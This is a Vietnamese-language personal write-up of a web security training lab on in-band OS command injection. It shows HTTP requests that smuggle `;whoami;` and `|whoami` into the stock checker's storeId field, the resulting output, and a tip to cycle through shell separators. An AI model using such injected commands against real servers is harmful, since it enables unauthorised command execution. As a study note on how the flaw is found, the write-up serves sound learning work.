![[lab-os-command-simple.png]]
lab stock check ghép input vào shell và trả output về luôn.

> [!NOTE] phân tích đề
> product stock checker gửi `productId` + `storeId`.
> server chạy `stockreport.pl 381 29` gì đó.
> response trả raw output.
> nên mình đoán chèn `;whoami` là ăn.

### hướng giải
- [ ] mở product, bấm check stock, bắt request
- [ ] thử `& echo test123 &` xem output có reflect không
- [ ] đổi sang `;whoami;` hoặc `|whoami`
- [ ] đọc tên user

### giải
request gốc:

```http
POST /product/stock HTTP/1.1
Host: 0a5f33a606eaxxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

productId=1&storeId=1
```

mình chèn:

```http
POST /product/stock HTTP/1.1
Host: 0a5f33a606eaxxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

productId=1&storeId=1;whoami;
```

-> server chạy thành `stockreport.pl 1 1;whoami;`.
=> response trả về:

```text
1 in stock
peter
```

-> `peter` chính là user hiện tại.
=> thử thêm `|whoami` cũng được:

```http
productId=1&storeId=1|whoami
```

-> kết quả tương tự.

liên quan:
- [[lys thuyet OS command injection]]
- [[injection command]]
- [[Lab-OS command blind time]]

> [!NOTE] bài học
> sau khi quan sát lab này mình thấy...
> in-band là dễ nhất, chỉ cần tìm separator hợp.
> nên mình khi test cứ xoay `;`, `|`, `&`, `||` hết 1 vòng.
> thêm `&` ở cuối để tách phần dư cho chắc.
